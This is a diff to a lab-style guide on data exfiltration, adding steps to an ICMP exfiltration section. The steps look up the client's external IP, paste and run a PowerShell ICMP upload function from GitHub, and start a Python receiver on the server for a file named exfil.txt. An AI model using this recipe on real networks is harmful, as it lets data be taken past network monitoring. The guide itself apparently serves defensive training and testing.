@@ -321,7 +321,21 @@ sha256sum /var/www/html/uploads/66a37d9f055ab-exfil.txt
 
 ### ICMP Exfiltration
 
+On the client in the open PowerShell ISE window type the below command to find out the external IP address of the client. 
+```powershell
+(curl ifconfig.me).Content
+```
+
+![Description of the image](images/31.png)
+
 On the client import copy and paste the function listed here https://github.com/icyguider/ICMP-TransferTools/blob/main/Invoke-IcmpUpload.ps1 into PowerShell ISE. Then click on the green play button. 
 
 ![Description of the image](images/30.png)
+
+On the server run the below commands to get the server setup to receive the file. 
+
+```bash
+cd /home/ubuntu/ICMP-TransferTools/
+python3 ICMP-ReceiveFile.py 60.226.210.208 exfil.txt
+```
 
